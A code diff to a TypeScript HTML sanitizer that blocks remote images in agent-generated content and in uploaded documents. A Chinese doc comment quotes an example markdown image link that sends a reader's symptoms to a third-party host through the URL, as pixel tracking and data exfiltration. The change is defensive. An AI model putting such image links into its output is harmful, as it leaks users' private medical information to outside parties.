@@ -93,23 +93,31 @@ function ensureHook() {
 }
 
 export type SanitizeOptions = {
-  /** 默认放行远程图片；上传文档这类外部来源要传 false。 */
+  /** 默认放行远程图片；上传文档、Agent 正文这类外部来源要传 false。 */
   allowRemoteImages?: boolean
+}
+
+/** 临时切换远程图片策略；同步执行，结束后恢复上一档（可嵌套）。 */
+function withRemoteImages<T>(allow: boolean, run: () => T): T {
+  const previous = allowRemoteImages
+  allowRemoteImages = allow
+  try {
+    return run()
+  } finally {
+    allowRemoteImages = previous
+  }
 }
 
 export function sanitizeNewsHtml(html?: string, options?: SanitizeOptions): string {
   if (!html) return ""
   ensureHook()
-  allowRemoteImages = options?.allowRemoteImages ?? true
-  try {
-    return DOMPurify.sanitize(html, {
+  return withRemoteImages(options?.allowRemoteImages ?? true, () =>
+    DOMPurify.sanitize(html, {
       ALLOWED_TAGS,
       ALLOWED_ATTR,
       ALLOW_DATA_ATTR: false,
-    })
-  } finally {
-    allowRemoteImages = true
-  }
+    }),
+  )
 }
 
 /**
@@ -118,17 +126,20 @@ export function sanitizeNewsHtml(html?: string, options?: SanitizeOptions): stri
  * <p>Markdown 解析器已经关闭原始 HTML（`html: false`），这里仍再过一遍——
  * 语法高亮、链接自动识别、未来的插件都可能产出 HTML；纵深防御比信任
  * 单点配置便宜。`data-code` 只带代码文本，不参与任何 DOM 解释。
+ *
+ * <p>**不放行远程图片**：正文里的 `![](https://第三方/x.gif?d=症状)`
+ * 会让读者的浏览器直接请求第三方——那是像素追踪，也会把画面里的医学信息
+ * 拼进 URL 外带。知识库文档预览走的是同一条口径（`documentPreview.ts` 传
+ * `allowRemoteImages: false`）。
  */
 export function sanitizeAgentHtml(html?: string): string {
   if (!html) return ""
   ensureHook()
-  try {
-    return DOMPurify.sanitize(html, {
+  return withRemoteImages(false, () =>
+    DOMPurify.sanitize(html, {
       ALLOWED_TAGS: AGENT_ALLOWED_TAGS,
       ALLOWED_ATTR: AGENT_ALLOWED_ATTR,
       ALLOW_DATA_ATTR: false,
-    })
-  } finally {
-    allowRemoteImages = true
-  }
+    }),
+  )
 }
